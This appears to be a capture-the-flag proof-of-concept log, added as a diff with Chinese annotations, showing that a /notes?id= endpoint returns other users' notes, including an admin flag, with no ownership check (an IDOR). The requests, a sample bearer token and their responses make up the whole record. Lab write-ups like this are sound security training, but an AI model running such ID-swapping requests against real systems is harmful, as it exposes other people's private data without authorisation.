@@ -1,0 +1,12 @@
+[A] GET /notes?id=1  (no auth)
+{"id": "1", "note": "alice-note", "viewer": null}
+
+[B] GET /notes?id=2  (no auth)  -> 越权可读他人 note
+{"id": "2", "note": "admin-secret-FLAG{idor_user2}", "viewer": null}
+
+[C] GET /notes?id=2  -H 'Authorization: Bearer eyJ1aWQiOiAiMSIsICJ1c2VyIjogIiJ9'  (uid=1 普通用户 alice)
+HTTP/1.0 200 OK
+{"id": "2", "note": "admin-secret-FLAG{idor_user2}", "viewer": "1"}
+
+结论: /notes 仅用 ?id= 取数据，不校验 owner，uid=1 可读取 uid=2(admin/bob) 的 note → IDOR 成立。
+泄露 FLAG 之一: FLAG{idor_user2}
